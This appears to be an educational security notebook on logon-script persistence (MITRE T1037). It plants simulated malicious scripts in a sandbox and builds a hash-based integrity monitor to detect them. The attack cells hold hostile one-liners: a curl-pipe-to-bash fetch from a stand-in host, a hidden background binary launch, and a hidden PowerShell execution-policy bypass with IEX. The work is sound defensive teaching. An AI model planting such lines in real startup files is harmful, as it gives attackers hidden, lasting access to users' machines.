# Persistence via Logon Scripts

| Field | Value |
|---|---|
| MITRE ATT&CK | T1037 |
| Tactic | Persistence |
| Difficulty | Intermediate |
| Time | ~30 min |

## Threat Context

In 2018, threat intelligence teams linked APT28 (Fancy Bear) to a campaign targeting European government agencies. After gaining initial access through spearphishing, the group established persistence by planting malicious logon scripts that executed every time a user authenticated. These scripts silently launched a backdoor, ensuring the attackers maintained access even after password resets.

Logon scripts are a legitimate administrative tool — Active Directory Group Policy allows administrators to assign scripts that run at user logon. Attackers exploit this trust by inserting their own scripts into the logon process, blending malicious activity with normal system behavior.

This technique is particularly dangerous because logon scripts execute with the privileges of the authenticating user, often a domain administrator. The scripts persist across reboots and password changes, making them a reliable persistence mechanism that defenders frequently overlook during incident response.

## What You'll Learn
- How logon scripts work as a persistence mechanism on Windows and Unix systems
- How attackers plant and disguise malicious logon scripts
- How to detect unauthorized logon script modifications through file monitoring

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Simulates logon script persistence techniques in a safe, sandboxed manner

import os
import tempfile
import hashlib
import json
import time
from datetime import datetime
from pathlib import Path

# Create a safe sandbox directory for all demos
SANDBOX = tempfile.mkdtemp(prefix='cyberlab_logon_')
print(f'Sandbox directory: {SANDBOX}')
print('All operations confined to this temp directory.')

## 1. Understanding Logon Script Locations

Attackers target specific filesystem locations where logon scripts are stored. On Windows, these include the NETLOGON share, Group Policy script directories, and user profile scripts. On Unix/macOS, `.bash_profile`, `.bashrc`, `.zshrc`, and `/etc/profile.d/` are common targets.

We'll simulate these locations inside our sandbox to understand the structure without touching real system files.

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Simulate logon script directory structures in sandbox

# Simulated logon script locations (all inside sandbox)
LOGON_PATHS = {
    'windows_netlogon': os.path.join(SANDBOX, 'NETLOGON'),
    'windows_gpo': os.path.join(SANDBOX, 'GroupPolicy', 'User', 'Scripts', 'Logon'),
    'linux_profile_d': os.path.join(SANDBOX, 'etc', 'profile.d'),
    'user_bashrc': os.path.join(SANDBOX, 'home', 'user'),
}

# Create directory structure
for name, path in LOGON_PATHS.items():
    os.makedirs(path, exist_ok=True)
    print(f'[+] Created: {name:25s} -> {path}')

# Place legitimate logon scripts (baseline)
legitimate_scripts = {
    os.path.join(LOGON_PATHS['windows_netlogon'], 'map_drives.bat'):
        '@echo off\nnet use H: \\\\fileserver\\home\n',
    os.path.join(LOGON_PATHS['windows_gpo'], 'set_proxy.vbs'):
        'WScript.Echo "Setting proxy..."\n',
    os.path.join(LOGON_PATHS['linux_profile_d'], 'set_path.sh'):
        '#!/bin/bash\nexport PATH=$PATH:/opt/tools\n',
    os.path.join(LOGON_PATHS['user_bashrc'], '.bashrc'):
        '# User bashrc\nexport EDITOR=vim\nalias ll="ls -la"\n',
}

for filepath, content in legitimate_scripts.items():
    with open(filepath, 'w') as f:
        f.write(content)

print(f'\n[*] Placed {len(legitimate_scripts)} legitimate logon scripts as baseline.')

## 2. Simulating Malicious Script Injection

Attackers typically either modify existing logon scripts or add new ones. The modification approach is stealthier because it doesn't create new files that might trigger alerts. The APT28 campaign used both techniques depending on the target environment.

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Demonstrate how attackers inject into logon scripts (sandbox only)

def hash_file(filepath):
    """Compute SHA-256 hash of a file for integrity checking."""
    h = hashlib.sha256()
    with open(filepath, 'rb') as f:
        h.update(f.read())
    return h.hexdigest()

# Record baseline hashes before any modifications
baseline_hashes = {}
for filepath in legitimate_scripts:
    baseline_hashes[filepath] = hash_file(filepath)

# --- Attack Technique 1: Append to existing script ---
target_bashrc = os.path.join(LOGON_PATHS['user_bashrc'], '.bashrc')
malicious_payload = (
    '\n# Added by system update\n'
    'curl -s http://example.com/update.sh | bash  # SIMULATED - not real\n'
)
with open(target_bashrc, 'a') as f:
    f.write(malicious_payload)
print('[ATTACK] Technique 1: Appended payload to .bashrc')
print(f'  Before hash: {baseline_hashes[target_bashrc][:16]}...')
print(f'  After hash:  {hash_file(target_bashrc)[:16]}...')

# --- Attack Technique 2: Drop new script ---
new_script_path = os.path.join(LOGON_PATHS['linux_profile_d'], 'zzz_update.sh')
new_script_content = (
    '#!/bin/bash\n'
    '# System metrics collector - SIMULATED\n'
    'nohup /tmp/.cache_update >/dev/null 2>&1 &\n'
)
with open(new_script_path, 'w') as f:
    f.write(new_script_content)
print(f'\n[ATTACK] Technique 2: Dropped new script: {os.path.basename(new_script_path)}')

# --- Attack Technique 3: Windows GPO script addition ---
gpo_script = os.path.join(LOGON_PATHS['windows_gpo'], 'update_check.bat')
gpo_content = (
    '@echo off\n'
    'rem System update verification\n'
    'powershell -ep bypass -w hidden -c "IEX(example.com)"\n'
)
with open(gpo_script, 'w') as f:
    f.write(gpo_content)
print(f'[ATTACK] Technique 3: Added GPO logon script: {os.path.basename(gpo_script)}')

## 3. Building a Logon Script Monitor

Defense starts with knowing the baseline. A file integrity monitor compares current file hashes against known-good hashes and flags any modifications or new additions.

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Build a logon script integrity monitor

def scan_logon_directories(paths, baseline):
    """Scan logon script directories and compare against baseline."""
    findings = []
    
    for name, dirpath in paths.items():
        if not os.path.exists(dirpath):
            continue
        for filename in os.listdir(dirpath):
            filepath = os.path.join(dirpath, filename)
            if not os.path.isfile(filepath):
                continue
            
            current_hash = hash_file(filepath)
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
            
            if filepath in baseline:
                if current_hash != baseline[filepath]:
                    findings.append({
                        'type': 'MODIFIED',
                        'severity': 'HIGH',
                        'location': name,
                        'file': filename,
                        'path': filepath,
                        'modified': mtime.isoformat(),
                    })
            else:
                findings.append({
                    'type': 'NEW_FILE',
                    'severity': 'CRITICAL',
                    'location': name,
                    'file': filename,
                    'path': filepath,
                    'modified': mtime.isoformat(),
                })
    
    return findings

# Run the monitor
detections = scan_logon_directories(LOGON_PATHS, baseline_hashes)

print(f'=== Logon Script Integrity Monitor ===')
print(f'Baseline files: {len(baseline_hashes)}')
print(f'Findings: {len(detections)}\n')

for d in detections:
    icon = '!!' if d['severity'] == 'CRITICAL' else '!'
    print(f"[{icon}] {d['severity']:8s} | {d['type']:10s} | {d['location']:25s} | {d['file']}")

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Visualization: Logon script attack surface and detections

import matplotlib.pyplot as plt
import matplotlib.patches as mpatches

fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 5))
fig.patch.set_facecolor('#0F0F0F')
fig.suptitle('Logon Script Persistence Analysis', color='#EDEAE4', fontsize=14, y=1.02)

# Left: Attack techniques by type
ax1.set_facecolor('#1A1A1A')
techniques = ['Append to\nexisting', 'Drop new\nscript', 'GPO script\naddition']
stealth_scores = [8, 5, 7]  # 1-10 stealth rating
colors = ['#CF9B6C', '#6C9BCF', '#9BCF6C']
bars = ax1.barh(techniques, stealth_scores, color=colors, height=0.5, edgecolor='#282828')
ax1.set_xlim(0, 10)
ax1.set_xlabel('Stealth Score (1-10)', color='#7A7570', fontsize=10)
ax1.set_title('Attack Technique Stealth', color='#EDEAE4', fontsize=12)
for bar, score in zip(bars, stealth_scores):
    ax1.text(bar.get_width() + 0.2, bar.get_y() + bar.get_height()/2,
             str(score), va='center', color='#EDEAE4', fontsize=11)
ax1.tick_params(colors='#7A7570')
for spine in ax1.spines.values():
    spine.set_edgecolor('#282828')

# Right: Detection results
ax2.set_facecolor('#1A1A1A')
severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0}
for d in detections:
    severity_counts[d['severity']] = severity_counts.get(d['severity'], 0) + 1
sev_colors = {'CRITICAL': '#CF6C6C', 'HIGH': '#CF9B6C', 'MEDIUM': '#6C9BCF'}
labels = [k for k, v in severity_counts.items() if v > 0]
sizes = [v for v in severity_counts.values() if v > 0]
pie_colors = [sev_colors[l] for l in labels]
if sizes:
    ax2.pie(sizes, labels=labels, colors=pie_colors, autopct='%1.0f%%',
            textprops={'color': '#EDEAE4', 'fontsize': 11},
            wedgeprops={'edgecolor': '#282828'})
ax2.set_title('Detection Severity Breakdown', color='#EDEAE4', fontsize=12)

plt.tight_layout()
plt.show()

## Defender's Perspective

| Indicator | Type | Detection |
|---|---|---|
| New files in NETLOGON share or /etc/profile.d/ | File Creation | File integrity monitoring (OSSEC, Wazuh) |
| Modified .bashrc/.bash_profile with encoded commands | File Modification | Hash comparison against baseline snapshots |
| GPO scripts.ini changes outside change windows | Configuration Change | Windows Event ID 5136 (Directory Service Changes) |
| Logon scripts executing network connections | Behavioral | EDR telemetry on child processes of logon scripts |

## Article Seed

**Title:** How APT28 Hides in Plain Sight: Logon Script Persistence Explained

**Opening:** Every time a user logs in, the operating system runs a series of scripts — and attackers know exactly where to plant their payloads. Logon script persistence (MITRE T1037) is one of the most reliable techniques in a threat actor's toolkit because it leverages built-in OS functionality that administrators rarely audit.

**Sections:**
1. What are logon scripts and why do they exist?
2. How APT28 weaponized logon scripts in the wild
3. Building a file integrity monitor in Python
4. Detection strategies: from hash baselines to EDR rules

**Tags:** cybersecurity, persistence, mitre-attack, python, threat-detection

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Self-check assertions

import shutil

# Verify detections worked correctly
assert len(detections) == 3, f'Expected 3 detections, got {len(detections)}'

detection_types = [d['type'] for d in detections]
assert 'MODIFIED' in detection_types, 'Should detect modified .bashrc'
assert 'NEW_FILE' in detection_types, 'Should detect new script files'

# Verify severity classification
for d in detections:
    if d['type'] == 'NEW_FILE':
        assert d['severity'] == 'CRITICAL', 'New files should be CRITICAL severity'
    elif d['type'] == 'MODIFIED':
        assert d['severity'] == 'HIGH', 'Modified files should be HIGH severity'

# Verify baseline hashing works
assert len(baseline_hashes) == 4, 'Should have 4 baseline hashes'

# Cleanup sandbox
shutil.rmtree(SANDBOX, ignore_errors=True)
print('All assertions passed.')
print('Sandbox cleaned up.')